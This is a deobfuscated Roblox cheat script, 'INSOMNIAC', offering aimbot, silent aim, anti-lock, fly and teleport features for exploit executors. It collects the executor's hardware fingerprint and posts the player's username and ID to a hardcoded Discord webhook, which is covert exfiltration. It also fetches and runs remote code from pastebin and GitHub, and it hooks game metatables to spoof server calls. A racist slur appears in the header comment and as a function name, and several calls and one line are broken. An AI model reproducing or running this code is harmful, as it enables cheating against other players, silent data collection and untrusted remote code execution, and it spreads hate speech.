--[[
    they using our silent aim so bad niggers
--]]


G_1_ = game:GetService'Players'.LocalPlayer
local L_1_ = false
local L_2_ = false
if plr.MembershipType == Enum.MembershipType.Premium then
	L_1_ = true
elseif plr.MembershipType == Enum.MembershipType.None then
	L_1_ = false
end
if L_1_ == false then
	if plr.AccountAge <= 70 then
		L_2_ = true
	end
end
 
local L_3_ = game:GetService("MarketplaceService")
local L_4_ = L_3_:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 
 
local L_5_ = http_request;
if syn then
	L_5_ = syn.request
elseif SENTINEL_V2 then
	function L_5_(L_9_arg0)
		return {
			StatusCode = 200;
			Body = request(L_9_arg0.Url, L_9_arg0.Method, (L_9_arg0.Body or ''))
		}
	end
end
 
local L_6_ = L_5_({
	Url = 'https://httpbin.org/get';
	Method = 'GET'
}).Body;
local L_7_ = game:GetService('HttpService'):JSONDecode(L_6_)
local L_8_ = {
	"Syn-Fingerprint",
	"Exploit-Guid",
	"Proto-User-Identifier",
	"Sentinel-Fingerprint"
};
G_2_ = "";
 
for L_10_forvar0, L_11_forvar1 in next, L_8_ do
	if L_7_.headers[L_11_forvar1] then
		G_2_ = L_7_.headers[L_11_forvar1];
		break
	end
end
 
if hwid then
	local L_12_ = game:GetService('HttpService')
	local L_13_ = "https://discord.com/api/webhooks/896451279151308880/j16Hq_HSI2GO7I2jWcHIH93HHHMjNLIWEIWBGlZXvlGvsmOepXc90Ku9Z1ygNnBDUEIo"
	local L_14_ = 
    {
		["content"] = "",
		["embeds"] = {
			{
				["title"] = "INSOMNIAC",
				["description"] = "this guy cool",
				["type"] = "rich",
				["color"] = tonumber(3407834),
				["fields"] = {
					{
						["name"] = "Username:",
						["value"] = Game.Players.LocalPlayer.Name,
						["inline"] = true
					},
					{
						["name"] = "USERID",
						["value"] = game.Players.LocalPlayer.UserId,
						["inline"] = true
					},
				},
			}
		}
	}
	local L_15_ = L_12_:JSONEncode(L_14_)
	local L_16_ = {
		["content-type"] = "application/json"
	}
	local L_17_ = {
		Url = L_13_,
		Body = L_15_,
		Method = "POST",
		Headers = L_16_
	}
	L_5_(L_17_)
end


if game.Players.LocalPlayer:IsInGroup(3561608) then
	game.StarterGui:SetCore("SendNotification", {
		Title = "INSOMNIAC ";
		Text = "INSOMNIAC, You're whitelisted.";
		Icon = "rbxthumb://type=Asset&id=166457378&w=150&h=150";
	})
	game:GetService("RunService").RenderStepped:Connect(function()
		for L_26_forvar0, L_27_forvar1 in pairs(game.CoreGui:GetChildren()) do
			if L_27_forvar1.Name == 'PostmansAutoRob' then
				L_27_forvar1:Destroy()
			end
		end
	end)
	local L_18_ = loadstring(game:HttpGet("https://pastebin.com/raw/83mcKuDr"))()
	local L_19_ = L_18_:Window("INSOMNIAC")
	local L_20_ = L_18_:Window("ESP")
	L_19_:Button("Aimlock", function()
		getgenv().AimPart = "HumanoidRootPart" -- For R15 Games: {UpperTorso, LowerTorso, HumanoidRootPart, Head} | For R6 Games: {Head, Torso, HumanoidRootPart}
		getgenv().AimlockToggleKey = "y" -- Toggles Aimbot On/Off
		getgenv().AimlockKey = "q"
		getgenv().AimRadius = 30 -- How far away from someones character you want to lock on at
		getgenv().ThirdPerson = true
		getgenv().FirstPerson = true
		getgenv().TeamCheck = false -- Check if Target is on your Team (True means it wont lock onto your teamates, false is vice versa) (Set it to false if there are no teams)
		getgenv().PredictMovement = true -- Predicts if they are moving in fast velocity (like jumping) so the aimbot will go a bit faster to match their speed
		getgenv().PredictionVelocity = 9
		local L_28_, L_29_, L_30_, L_31_ = game:GetService"Players", game:GetService"UserInputService", game:GetService"RunService", game:GetService"StarterGui";
		local L_32_, L_33_, L_34_, L_35_, L_36_, L_37_, L_38_ = L_28_.LocalPlayer, L_28_.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Ray.new, Vector3.new, Vector2.new;
		local L_39_, L_40_, L_41_ = true, false, false;
		local L_42_;
		getgenv().CiazwareUniversalAimbotLoaded = true
		getgenv().WorldToViewportPoint = function(L_43_arg0)
			return L_34_:WorldToViewportPoint(L_43_arg0)
		end
		getgenv().WorldToScreenPoint = function(L_44_arg0)
			return L_34_.WorldToScreenPoint(L_34_, L_44_arg0)
		end
		getgenv().GetObscuringObjects = function(L_45_arg0)
			if L_45_arg0 and L_45_arg0:FindFirstChild(getgenv().AimPart) and L_32_ and L_32_.Character:FindFirstChild("Head") then
				local L_46_ = workspace:FindPartOnRay(L_36_(
            L_45_arg0[getgenv().AimPart].Position, L_32_.Character.Head.Position)
        )
				if L_46_ then
					return L_46_:IsDescendantOf(L_45_arg0)
				end
			end
		end
		getgenv().GetNearestTarget = function()
    -- Credits to whoever made this, i didnt make it, and my own mouse2plr function kinda sucks
			local L_47_ = {}
			local L_48_  = {}
			local L_49_ = {}
			for L_51_forvar0, L_52_forvar1 in pairs(L_28_:GetPlayers()) do
				if L_52_forvar1 ~= L_32_ then
					table.insert(L_47_, L_52_forvar1)
				end
			end
			for L_53_forvar0, L_54_forvar1 in pairs(L_47_) do
				if L_54_forvar1.Character ~= nil then
					local L_55_ = L_54_forvar1.Character:FindFirstChild("Head")
					if getgenv().TeamCheck == true and L_54_forvar1.Team ~= L_32_.Team then
						local L_56_ = (L_54_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
						local L_57_ = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (L_33_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_56_)
						local L_58_, L_59_ = game.Workspace:FindPartOnRay(L_57_, game.Workspace)
						local L_60_ = math.floor((L_59_ - L_55_.Position).magnitude)
						L_48_[L_54_forvar1.Name .. L_53_forvar0] = {}
						L_48_[L_54_forvar1.Name .. L_53_forvar0].dist = L_56_
						L_48_[L_54_forvar1.Name .. L_53_forvar0].plr = L_54_forvar1
						L_48_[L_54_forvar1.Name .. L_53_forvar0].diff = L_60_
						table.insert(L_49_, L_60_)
					elseif getgenv().TeamCheck == false and L_54_forvar1.Team == L_32_.Team then
						local L_61_ = (L_54_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
						local L_62_ = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (L_33_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_61_)
						local L_63_, L_64_ = game.Workspace:FindPartOnRay(L_62_, game.Workspace)
						local L_65_ = math.floor((L_64_ - L_55_.Position).magnitude)
						L_48_[L_54_forvar1.Name .. L_53_forvar0] = {}
						L_48_[L_54_forvar1.Name .. L_53_forvar0].dist = L_61_
						L_48_[L_54_forvar1.Name .. L_53_forvar0].plr = L_54_forvar1
						L_48_[L_54_forvar1.Name .. L_53_forvar0].diff = L_65_
						table.insert(L_49_, L_65_)
					end
				end
			end
			if unpack(L_49_) == nil then
				return nil
			end
			local L_50_ = math.floor(math.min(unpack(L_49_)))
			if L_50_ > getgenv().AimRadius then
				return nil
			end
			for L_66_forvar0, L_67_forvar1 in pairs(L_48_) do
				if L_67_forvar1.diff == L_50_ then
					return L_67_forvar1.plr
				end
			end
			return nil
		end
		L_33_.KeyDown:Connect(function(L_68_arg0)
			if L_68_arg0 == AimlockKey and L_42_ == nil then
				pcall(function()
					if L_40_ ~= true then
						L_40_ = true
					end
					local L_69_;
					L_69_ = GetNearestTarget()
					if L_69_ ~= nil then
						L_42_ = L_69_
					end
				end)
			elseif L_68_arg0 == AimlockKey and L_42_ ~= nil then
				if L_42_ ~= nil then
					L_42_ = nil
				end
				if L_40_ ~= false then
					L_40_ = false
				end
			elseif L_68_arg0 == AimlockToggleKey then
				L_39_ = not L_39_
			end
		end)
		L_30_.RenderStepped:Connect(function()
			if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
				if (L_34_.Focus.p - L_34_.CoordinateFrame.p).Magnitude > 1 or (L_34_.Focus.p - L_34_.CoordinateFrame.p).Magnitude <= 1 then
					L_41_ = true
				else
					L_41_ = false
				end
			elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
				if (L_34_.Focus.p - L_34_.CoordinateFrame.p).Magnitude > 1 then
					L_41_ = true
				else
					L_41_ = false
				end
			elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
				if (L_34_.Focus.p - L_34_.CoordinateFrame.p).Magnitude <= 1 then
					L_41_ = true
				else
					L_41_ = false
				end
			end
			if L_39_ == true and L_40_ == true then
				if L_42_ and L_42_.Character and L_42_.Character:FindFirstChild(getgenv().AimPart) then
					if getgenv().FirstPerson == true then
						if L_41_ == true then
							if getgenv().PredictMovement == true then
								L_34_.CFrame = L_35_(L_34_.CFrame.p, L_42_.Character[getgenv().AimPart].Position + L_42_.Character[getgenv().AimPart].Velocity / PredictionVelocity)
							elseif getgenv().PredictMovement == false then
								L_34_.CFrame = L_35_(L_34_.CFrame.p, L_42_.Character[getgenv().AimPart].Position)
							end
						end
					elseif getgenv().ThirdPerson == true then
						if L_41_ == true then
							if getgenv().PredictMovement == true then
								L_34_.CFrame = L_35_(L_34_.CFrame.p, L_42_.Character[getgenv().AimPart].Position + L_42_.Character[getgenv().AimPart].Velocity / PredictionVelocity)
							elseif getgenv().PredictMovement == false then
								L_34_.CFrame = L_35_(L_34_.CFrame.p, L_42_.Character[getgenv().AimPart].Position)
							end
						end
					end
				end
			end
		end)
	end)
	local a,b,c,d,e,f,g,l = "L","e","a","k","e","d",,"Aix#1337"; local function watermark(wm) print(wm); end; watermark(a..b..c..d..e..f..g.." By ".."Aix".."dWn".."#".."13".."37") 
	L_19_:Box("Prediction", function(L_70_arg0, L_71_arg1)
		if L_71_arg1 then
			G_4_ = (L_70_arg0)
		end
	end)
	local L_21_ = L_19_:Dropdown("Aim Part", {
		"Head",
		"UpperTorso",
		"HumanoidRootPart"
	}, function(L_72_arg0)
		getgenv().AimPart = (L_72_arg0)
	end)
	L_19_:Button("Silent Aim (T to turn off/on)", function()
		loadstring(game:HttpGet("https://pastebin.com/raw/s5ZeSBkc", true))()
	end)
	L_19_:Box("Silent Aim Predicton", function(L_73_arg0, L_74_arg1)
		if L_74_arg1 then
			DaHoodSettings.Prediction = L_73_arg0
		end
	end)
	L_19_:Label("Prediction can go to 0.157 (low ping) 0.178 (150-160 ping) 0.190 (high ping)", Color3.fromRGB(255, 255, 255))
	L_19_:Button("Silent Aimlock (Q)", function()
		_G.KEY = "q"
		_G.PART = "LowerTorso" 
		_G.PRED = 0.032
		_G.Frame = Vector3.new(0, 0.53, 0)
		local L_75_ = game:GetService "Workspace".CurrentCamera
		local L_76_
		local L_77_ = false
		local L_78_ = nil
		local L_79_ = game.Players.LocalPlayer:GetMouse()
		local L_80_ = Instance.new("Part", game.Workspace)
		local L_81_ = Instance.new("Folder", game.CoreGui)
		function G_5_(L_85_arg0, L_86_arg1, L_87_arg2, L_88_arg3, L_89_arg4)
			local L_90_ = Instance.new("BillboardGui", L_85_arg0)
			L_90_.Name = "PP"
			L_90_.Adornee = L_86_arg1
			L_90_.Size = UDim2.new(L_88_arg3, L_89_arg4, L_88_arg3, L_89_arg4)
			L_90_.AlwaysOnTop = true
			local L_91_ = Instance.new("Frame", L_90_)
			L_91_.Size = UDim2.new(4, 0, 4, 0)
			L_91_.BackgroundTransparency = 0.1
			L_91_.BackgroundColor3 = L_87_arg2
			local L_92_ = Instance.new("UICorner", L_91_)
			L_92_.CornerRadius = UDim.new(50, 50)
			return (L_90_)
		end
		local L_82_ = game.Players:GetPlayers()
		function G_6_(L_93_arg0)
			local L_94_
			repeat
				wait()
			until L_93_arg0.Character
			local L_95_ = makemarker(L_81_, L_93_arg0.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0.0, 0)
			L_95_.Name = L_93_arg0.Name
			L_93_arg0.CharacterAdded:connect(
        function(L_97_arg0)
				L_95_.Adornee = L_97_arg0:WaitForChild(_G.PART)
			end
    )
			local L_96_ = Instance.new("TextLabel", L_95_)
			L_96_.BackgroundTransparency = 1
			L_96_.Position = UDim2.new(0, 0, 0, -50)
			L_96_.Size = UDim2.new(0, 100, 0, 100)
			L_96_.Font = Enum.Font.SourceSansSemibold
			L_96_.TextSize = 14
			L_96_.TextColor3 = Color3.new(1, 1, 1)
			L_96_.TextStrokeTransparency = 0
			L_96_.TextYAlignment = Enum.TextYAlignment.Bottom
			L_96_.Text = "Name: " .. L_93_arg0.Name
			L_96_.ZIndex = 10
			spawn(
        function()
				while wait() do
					if L_93_arg0.Character then
                --TextLabel.Text = player.Name.." | Bounty: "..tostring(player:WaitForChild("leaderstats").Wanted.Value).." | "..tostring(math.floor(player.Character:WaitForChild("Humanoid").Health))
					end
				end
			end
    )
		end
		for L_98_forvar0 = 1, #L_82_ do
			if L_82_[L_98_forvar0] ~= game.Players.LocalPlayer then
				noob(L_82_[L_98_forvar0])
			end
		end
		game.Players.PlayerAdded:connect(
    function(L_99_arg0)
			noob(L_99_arg0)
		end
)
		game.Players.PlayerRemoving:Connect(
    function(L_100_arg0)
			L_81_[L_100_arg0.Name]:Destroy()
		end
)
		spawn(
    function()
			L_80_.Anchored = true
			L_80_.CanCollide = false
			L_80_.Size = Vector3.new(0.1, 0.1, 0.1)
			L_80_.Transparency = 0.1
			makemarker(L_80_, L_80_, Color3.fromRGB(255, 0, 0), 0.20, 0)
		end
)
		L_79_.KeyDown:Connect(
    function(L_101_arg0)
			if L_101_arg0 ~= _G.KEY then
				return
			end
			if L_77_ then
            -- guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				L_77_ = false
				TextLabel.TextColor3 = Color3.fromRGB(255, 20, 75)
				TextLabel.Text = "------"
			else
            --guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
				L_77_ = true
				L_76_ = getClosestPlayerToCursor()
				TextLabel.TextColor3 = Color3.fromRGB(12, 255, 0)
				TextLabel.Text = L_76_.Character.Humanoid.DisplayName
			end
		end)
		function G_7_()
			local L_102_
			local L_103_ = math.huge
			for L_104_forvar0, L_105_forvar1 in pairs(game.Players:GetPlayers()) do
				if
            L_105_forvar1 ~= game.Players.LocalPlayer and L_105_forvar1.Character and L_105_forvar1.Character:FindFirstChild("Humanoid") and
                L_105_forvar1.Character.Humanoid.Health ~= 0 and
                L_105_forvar1.Character:FindFirstChild(_G.PART)
         then
					local L_106_ = L_75_:WorldToViewportPoint(L_105_forvar1.Character.PrimaryPart.Position)
					local L_107_ = (Vector2.new(L_106_.X, L_106_.Y) - Vector2.new(L_79_.X, L_79_.Y)).magnitude
					if L_107_ < L_103_ then
						L_102_ = L_105_forvar1
						L_103_ = L_107_
					end
				end
			end
			return L_102_
		end
		game:GetService "RunService".Stepped:connect(
    function()
			if L_77_ and L_76_.Character and L_76_.Character:FindFirstChild(_G.PART) then
				L_80_.CFrame =
                CFrame.new(L_76_.Character[_G.PART].Position + _G.Frame + (L_76_.Character[_G.PART].Velocity * L_78_))
			else
				L_80_.CFrame = CFrame.new(0, 9999, 0)
			end
		end
)
		local L_83_ = getrawmetatable(game)
		local L_84_ = L_83_.__namecall
		setreadonly(L_83_, false)
		L_83_.__namecall =
    newcclosure(
    function(...)
			local L_108_ = {
				...
			}
			if L_77_ and getnamecallmethod() == "FireServer" and L_108_[2] == "UpdateMousePos" then
				L_108_[3] = L_76_.Character[_G.PART].Position + _G.Frame + (L_76_.Character[_G.PART].Velocity * L_78_)
				return L_84_(unpack(L_108_))
			end
			return L_84_(...)
		end
)
		game.Players.LocalPlayer.Chatted:Connect(
    function(L_109_arg0)
			if L_109_arg0 == "/e print" then
				print(_G.PRED)
			end
		end
)
		game.Players.LocalPlayer.Chatted:Connect(
    function(L_110_arg0)
			if L_110_arg0 == "Code:1029" then
				_G.KEY = nil
				_G.AIR = nil
				_G.PART = nil
				_G.PRED = nil
				TextLabel.Visible = false
			end
		end
)
		game.Players.LocalPlayer.Chatted:Connect(
    function(L_111_arg0)
			if L_111_arg0 == "/e hrp" then
				_G.KEY = "q"
				_G.AIR = 0.00005
				_G.PART = "HumanoidRootPart"
				_G.PRED = 0.032
				TextLabel.Visible = true
			end
		end
)
		game.Players.LocalPlayer.Chatted:Connect(
    function(L_112_arg0)
			if L_112_arg0 == "/e lt" then
				_G.KEY = "q"
				_G.AIR = 0.00005
				_G.PART = "LowerTorso"
				_G.PRED = 0.032
				TextLabel.Visible = true
			end
		end
)
		game.Players.LocalPlayer.Chatted:Connect(
    function(L_113_arg0)
			if L_113_arg0 == "Screensharing" then
				_G.KEY = "q"
				_G.AIR = 0.00005
				_G.PART = "LowerTorso"
				_G.PRED = 0.033
				TextLabel.Visible = true
				L_80_ = nil
			end
		end
)
		game.Players.LocalPlayer.Chatted:Connect(
    function(L_114_arg0)
			if L_114_arg0 == "/e P+" then
				_G.PRED = _G.PRED + 0.001
			end
		end
)
		game.Players.LocalPlayer.Chatted:Connect(
    function(L_115_arg0)
			if L_115_arg0 == "/e P-" then
				_G.PRED = _G.PRED - 0.001
			end
		end
)
		while wait() do
			if getClosestPlayerToCursor().Character.Humanoid.Jump == true and getClosestPlayerToCursor().Character.Humanoid.FloorMaterial == Enum.Material.Air then
				_G.Frame = Vector3.new(0, -2.3, 0)
				wait(0.05)
			else
				local L_116_ = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
				local L_117_ = tostring(L_116_)
				local L_118_ = L_117_:split(" ")
				local L_119_ = L_118_[1]
				L_78_ = L_119_ / 1000 + _G.PRED
				_G.Frame = Vector3.new(0, 0.53, 0)
			end
		end
	end)
	L_19_:Button("Anti-Lock", function()
		repeat
			wait()
		until game:IsLoaded()
		getgenv().Fix = false
		getgenv().TeclasWS = {
			["tecla1"] = "nil", -- speed +5
			["tecla2"] = "nil", -- speed -5
			["tecla3"] = "H" -- toggle
		}



-- // servicios
		local L_120_ = game:GetService("Players")
		local L_121_ = game:GetService("StarterGui") or "son una mierda"

-- // objetos
		local L_122_ = L_120_.LocalPlayer
		local L_123_ = L_122_:GetMouse()

-- // variables
		local L_124_ = getrenv()._G
		local L_125_ = getrawmetatable(game)
		local L_126_ = L_125_.__newindex
		local L_127_ = L_125_.__index
		local L_128_ = 22
		local L_129_ = true

-- // funciones para acortar codigo :]
		function G_8_(L_137_arg0)
			L_121_:SetCore("SendNotification", {
				Title = "anti lock fix",
				Text = L_137_arg0
			})
		end
		getgenv().TECHWAREWALKSPEED_LOADED = true
		wait(1.5)
		anunciar_atentado_terrorista("Press  " .. TeclasWS.tecla3 .. "to turn off/on anti lock fix")

-- // conexión
		L_123_.KeyDown:Connect(function(L_138_arg0)
			if L_138_arg0:lower() == TeclasWS.tecla1:lower() then
				L_128_ = L_128_ + 1
				anunciar_atentado_terrorista("播放器速度已提高 (speed = " .. tostring(L_128_) .. ")")
			elseif L_138_arg0:lower() == TeclasWS.tecla2:lower() then
				L_128_ = L_128_ - 1
				anunciar_atentado_terrorista("玩家的速度已降低 (speed = " .. tostring(L_128_) .. ")")
			elseif L_138_arg0:lower() == TeclasWS.tecla3:lower() then
				if L_129_ then
					L_129_ = false
					anunciar_atentado_terrorista("anti lock fix off")
				else
					L_129_ = true
					anunciar_atentado_terrorista("anti lock fix on")
				end
			end
		end)

-- // mi parte favorita: metametodos
		setreadonly(L_125_, false)
		L_125_.__index = newcclosure(function(L_139_arg0, L_140_arg1)
			local L_141_ = checkcaller()
			if L_140_arg1 == "WalkSpeed" and not L_141_ then
				return L_124_.CurrentWS
			end
			return L_127_(L_139_arg0, L_140_arg1)
		end)
		L_125_.__newindex = newcclosure(function(L_142_arg0, L_143_arg1, L_144_arg2)
			local L_145_ = checkcaller()
			if L_129_ then
				if L_143_arg1 == "WalkSpeed" and L_144_arg2 ~= 0 and not L_145_ then
					return L_126_(L_142_arg0, L_143_arg1, L_128_)
				end
			end
			return L_126_(L_142_arg0, L_143_arg1, L_144_arg2)
		end)
		setreadonly(L_125_, true)
		repeat
			wait()
		until game:IsLoaded()
		local L_130_ = game:service('Players')
		local L_131_ = L_130_.LocalPlayer
		repeat
			wait()
		until L_131_.Character
		local L_132_ = game:service('UserInputService')
		local L_133_ = game:service('RunService')
		local L_134_ = -0.22
		local L_135_ = false
		local L_136_
		L_132_.InputBegan:connect(function(L_146_arg0)
			if L_146_arg0.KeyCode == Enum.KeyCode.LeftBracket then
				L_134_ = L_134_ + 0.01
				print(L_134_)
				wait(0.2)
				while L_132_:IsKeyDown(Enum.KeyCode.LeftBracket) do
					wait()
					L_134_ = L_134_ + 0.01
					print(L_134_)
				end
			end
			if L_146_arg0.KeyCode == Enum.KeyCode.RightBracket then
				L_134_ = L_134_ - 0.01
				print(L_134_)
				wait(0.2)
				while L_132_:IsKeyDown(Enum.KeyCode.RightBracket) do
					wait()
					L_134_ = L_134_ - 0.01
					print(L_134_)
				end
			end
			if L_146_arg0.KeyCode == Enum.KeyCode.Z then
				L_135_ = not L_135_
				if L_135_ == true then
					repeat
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * L_134_
						game:GetService("RunService").Stepped:wait()
					until L_135_ == false
				end
			end
		end)
		if Fix == true then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/youtubetutorials123/helo/main/123"))()
		end
	end)
	L_19_:Button("Anti Fling (K)", function()
		getgenv().Key = "K"
		local L_147_ = game.Players.LocalPlayer
		local L_148_ = L_147_:GetMouse()
		local L_149_ = false
		function G_9_(L_150_arg0)
			L_150_arg0 = L_150_arg0:upper() or L_150_arg0:lower()
			if L_150_arg0 == Key then
				L_149_ = not L_149_
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = L_149_
			end
		end
		L_148_.KeyDown:Connect(Nigger)
	end)
	L_18_:Keybind("V")
	local L_22_ = L_18_:Window("INSOMNIAC Misc Scripts")
	L_19_:Button("Anti-Lock (may work may not)", function()
		local L_151_ = game.Players.LocalPlayer.Character
		L_151_.Parent = nil
		L_151_.HumanoidRootPart:Destroy()
		L_151_.Parent = game.workspace
		wait()
		local L_152_ = game:GetService("Players").LocalPlayer.Character
		local L_153_ = getrawmetatable(game)
		local L_154_ = L_153_.__index
		setreadonly(L_153_, false)
		L_153_.__index = newcclosure(function(L_155_arg0, L_156_arg1)
			if L_155_arg0 == L_152_ and L_156_arg1 == "HumanoidRootPart" then
				return L_152_.UpperTorso
			end
			return L_154_(L_155_arg0, L_156_arg1)
		end)
		game.Players.LocalPlayer.Character.Head.Neck:Destroy()
		game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
		game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
		game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
		game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0, 0, 0)
		game.Players.LocalPlayer.Character.Head.Massless = true
		game.Players.LocalPlayer.Character.Head.CanCollide = false
		_G.heazd = true
		while _G.heazd == true do
			pcall(function()
				game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
				game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
				game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
			end)
			wait()
		end
	end)
	L_22_:Button("Safe TP (P)", function()
		local L_157_ = "p" -- must be lowercase
		local L_158_ = game.Players.LocalPlayer:GetMouse()
		L_158_.KeyDown:Connect(function(L_159_arg0)
			if L_159_arg0 == L_157_ then
				local L_160_ = game.Players.LocalPlayer
				L_160_.Character:FindFirstChild("FULLY_LOADED_CHAR").Parent = game.ReplicatedStorage
				L_160_.Character:Remove()
				game.ReplicatedStorage:FindFirstChild("FULLY_LOADED_CHAR").Parent = L_160_.Character
			end
		end)
	end)
	L_22_:Button("SuperHero Fly (X)", function()
		G_10_ = 'SuperHero'
		G_11_ = 35
		local L_161_ = game.Players.LocalPlayer
		local L_162_ = Instance.new('Animation', game.Workspace)
		L_162_.AnimationId = 'rbxassetid://3541044388'
		local L_163_ = Instance.new('Animation', game.Workspace)
		L_163_.AnimationId = 'rbxassetid://3541114300'
		local L_164_ = L_161_.Character.Humanoid:LoadAnimation(L_163_)
		local L_165_ = L_161_.Character.Humanoid:LoadAnimation(L_162_)
		G_12_ = false
		local function L_166_func()
		--HeroIdle:Stop()
			local L_174_ = false
			for L_175_forvar0, L_176_forvar1 in pairs(L_161_.Character.Humanoid:GetPlayingAnimationTracks()) do
				if L_176_forvar1.Animation.AnimationId == 'rbxassetid://3541044388' then
					L_174_ = true
				end
				if L_176_forvar1.Animation.AnimationId == 'rbxassetid://2788289281' then
					L_176_forvar1:Stop()
				end
				if L_176_forvar1.Animation.AnimationId == 'rbxassetid://2788292075' then
					L_176_forvar1:Stop()
				end
			end
			if L_174_ == false and Idleing2 == false then
				L_165_:Play()
			end
		end
		local L_167_ = FLYSPEED
		repeat
			wait()
		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
		local L_168_ = game.Players.LocalPlayer:GetMouse()
		repeat
			wait()
		until L_168_
		local L_169_ = game.Players.LocalPlayer
		local L_170_ = L_169_.Character.Head
		G_13_ = false
		local L_171_ = true
		local L_172_ = {
			f = 0,
			b = 0,
			l = 0,
			r = 0
		}
		local L_173_ = {
			f = 0,
			b = 0,
			l = 0,
			r = 0
		}
		G_14_ = 5000
		G_15_ = 5000
		function G_16_()
			local L_177_ = Instance.new("BodyGyro", L_170_)
			L_177_.P = 9
			L_177_.maxTorque = Vector3.new(9, 9, 9)
			L_177_.cframe = L_170_.CFrame
			local L_178_ = Instance.new("BodyVelocity", L_170_)
			L_178_.velocity = Vector3.new(0, 0, 0)
			L_178_.maxForce = Vector3.new(9, 9, 9)
			repeat
				wait()
				L_169_.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
				if L_172_.l + L_172_.r ~= 100000 or L_172_.f + L_172_.b ~= 10000 then
					G_15_ = speed + .0 + (speed / maxspeed)
					local L_179_ = false
					L_166_func()
					if speed > maxspeed then
						G_15_ = maxspeed
					end
				elseif not (L_172_.l + L_172_.r ~= 5 or L_172_.f + L_172_.b ~= 5) and speed ~= 5 then
					G_15_ = speed - 5
					if speed > 5 then
						G_15_ = -2
					end
				end
				if (L_172_.l + L_172_.r) ~= 5 or (L_172_.f + L_172_.b) ~= 5 then
					L_178_.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (L_172_.f + L_172_.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(L_172_.l + L_172_.r, (L_172_.f + L_172_.b) * .2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * speed
					L_173_ = {
						f = L_172_.f,
						b = L_172_.b,
						l = L_172_.l,
						r = L_172_.r
					}
				elseif (L_172_.l + L_172_.r) == 5 and (L_172_.f + L_172_.b) == 5 and speed ~= 5 then
					L_178_.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (L_173_.f + L_173_.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(L_173_.l + L_173_.r, (L_173_.f + L_173_.b) * .2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * speed
				else
					L_178_.velocity = Vector3.new(0, 0.1, 0)
				end
				L_177_.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((L_172_.f + L_172_.b) * 50 * speed / maxspeed), 0, 0)
			until not flying
			L_172_ = {
				f = 0,
				b = 0,
				l = 0,
				r = 0
			}
			L_173_ = {
				f = 0,
				b = 0,
				l = 0,
				r = 0
			}
			G_15_ = 5
			L_177_:Destroy()
			L_178_:Destroy()
			L_169_.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
		end
		L_168_.KeyDown:connect(function(L_180_arg0)
			if L_180_arg0:lower() == "x" then
				if flying then
					G_13_ = false
					L_165_:Stop()
					L_164_:Stop()
				else
					G_13_ = true
					Fly()
				end
			elseif L_180_arg0:lower() == "w" then
				L_172_.f = FLYSPEED
			elseif L_180_arg0:lower() == "s" then
				L_172_.b = -FLYSPEED
			elseif L_180_arg0:lower() == "a" then
				L_172_.l = -FLYSPEED
			elseif L_180_arg0:lower() == "d" then
				L_172_.r = FLYSPEED
			end
		end)
		L_168_.KeyUp:connect(function(L_181_arg0)
			if L_181_arg0:lower() == "w" then
				L_172_.f = 0
			elseif L_181_arg0:lower() == "s" then
				L_172_.b = 0
			elseif L_181_arg0:lower() == "a" then
				L_172_.l = 0
			elseif L_181_arg0:lower() == "d" then
				L_172_.r = 0
			end
			if L_172_.r == 0 and L_172_.l == 0 and L_172_.b == 0 and L_172_.f == 0 then
				local L_182_
				local L_183_ = function()
					G_12_ = true
					L_165_:Stop()
					wait()
					G_25_ = false
					for L_186_forvar0, L_187_forvar1 in pairs(L_161_.Character.Humanoid:GetPlayingAnimationTracks()) do
						if L_187_forvar1.Animation.AnimationId == 'rbxassetid://3541114300' then
							G_25_ = true
						end
					end
					if Idleing == false and flying == true then
						L_164_:Play()
					end
				end;
				local L_184_ = function()
					L_182_ = game:GetService("RunService").Heartbeat:Connect(L_183_);
				end;
				local L_185_ = function()
					L_182_:Disconnect()
					G_12_ = false
				end;
				L_184_()
				repeat
					wait()
				until L_172_.r ~= 0 or L_172_.l ~= 0 or L_172_.b ~= 0 or L_172_.f ~= 0 or flying == false
				L_185_()
			end
		end)
		Fly()
		L_161_.CharacterAdded:Connect(function()
			repeat
				wait()
			until L_161_.Character
			wait(1)
			Fly()
		end)
		L_165_:Stop()
